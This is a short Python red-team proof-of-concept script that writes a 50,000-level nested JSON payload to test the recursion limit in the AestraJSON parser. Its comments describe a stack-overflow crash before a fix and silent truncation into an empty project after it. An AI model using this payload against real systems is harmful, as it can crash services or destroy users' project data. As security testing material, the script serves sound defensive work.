#!/usr/bin/env python3
"""
Red Team PoC — SEC-RTM-004: JSON Parser Stack Exhaustion (DoS)
Target: AestraJSON.h parseValue() — recursive descent, kMaxJsonDepth=1024
Impact: Stack overflow at ~50k nesting levels → crash
Difficulty: Script Kiddie

Note: The fix added kMaxJsonDepth=1024 which limits recursion,
but 1024 stack frames is still enough to exhaust small-stack environments
(CI runners, containers with 2MB stack).
"""
import os, sys

def build_deep_json(depth):
    """Generate deeply nested JSON that tests the parser's recursion limit."""
    return "[" * depth + "]" * depth

def main():
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_json_stack.aes'
    depth = 50000  # Exceeds kMaxJsonDepth=1024 → parse returns empty JSON (safe)
    payload = build_deep_json(depth)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    size = os.path.getsize(output)
    print(f"[+] PoC: {output} ({size} bytes, depth={depth})")
    print("[+] kMaxJsonDepth=1024 → parser returns empty JSON at depth 1025")
    print("[+] Without the fix: 50k frames → stack overflow → SIGSEGV")
    print("[+] With fix: silently truncated — functional DoS (empty project)")

if __name__ == '__main__':
    main()
